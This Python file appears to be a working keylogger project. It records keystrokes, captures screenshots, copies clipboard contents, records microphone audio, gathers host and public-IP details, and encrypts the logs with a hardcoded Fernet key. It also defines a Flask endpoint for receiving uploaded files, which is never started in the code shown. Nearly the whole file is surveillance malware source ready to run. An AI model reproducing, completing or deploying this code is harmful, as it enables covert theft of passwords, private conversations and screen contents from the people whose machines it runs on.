# Libraries

# Libraries for collecting computer information.
import socket
import platform

import multiprocessing

# Library for web requests.
from flask import Flask, request
import requests
# Library for system info & time.
import time
import os

# Library for registring keystrokes.
from pynput.keyboard import Key, Listener

# Library for clipboard.
import win32clipboard

# Library for mic capabilities.
from scipy.io.wavfile import write
import sounddevice as sd

# Library for Encryption.
from cryptography.fernet import Fernet

import getpass
from requests import get

# Library for importing screenshots.
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


# Log file 

keys_info = "key_log.txt"
system_info = "sys_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio_recording.wav"
screenshot_info = "screenshot.png"

key_info_e = "key_log_encrypted.txt"
system_info_e = "sys_info_encrypted.txt"   
clipboard_info_e = "clipboard_encrypted.txt"

key = "7-2oBjGOW2nwL573jvPWQ9w9bcaVR6UA5BZlBqHWX0Q="

microphone_time = 15
time_iteration = 20
number_of_iterations_end = 5
file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
extend = "\\"
file_merge = file_path + extend

# Flask upload server Functionality
def start_upload_server(upload_folder='uploads', host='0.0.0.0', port=5000):
    app = Flask(__name__)
    os
    
    @app.route('/upload', methods=['POST'])
    def upload_file():
        if 'file' not in request.files:
            return "No file part in the request", 400
        
        file = request.files['file']
        
        if file.filename == '':
            return "No selected file", 400
        
        file_path = os.path.join(upload_folder, file.filename)
        file.save(file_path)
        print(f"[SERVER] Received file: {file.filename}")
        return f'File {file.filename} uploaded successfully', 200

    print(f"[SERVER] Starting upload server at {host}:{port} with upload folder '{upload_folder}'")
    app.run(host=host, port=port)

# Local IP Address Functionality
def get_local_ip():
    s= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'
    finally:
        s.close()
    return local_ip



def get_system_info():
    with open(file_path + extend + "sys_info.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception as e:
            f.write("Could not get public IP address: " + str(e))
        
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

get_system_info()

def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: " + pasted_data + "\n")
        except Exception as e:
            f.write("Could not read clipboard: " + str(e))
        
def record_audio():
    fs = 44100  
    seconds = microphone_time 

    try:
        print("Recording audio...")
        recorded_audio = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()  
        write(file_path + extend + "audio_recording.wav", fs, recorded_audio)  
        print("Audio recording saved.")
    except Exception as e:
        print("Error recording audio:", str(e))

record_audio()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")

        screenshot()

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


files_to_encrypt = [file_merge + keys_info, file_merge + system_info, file_merge + clipboard_info]
encrypted_files = [file_merge + key_info_e, file_merge + system_info_e, file_merge + clipboard_info_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], "rb") as f:
        data = f.read
    
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data())

    with open(encrypted_files[count], "wb") as f:
        f.write(encrypted)

    count += 1

time.sleep(120)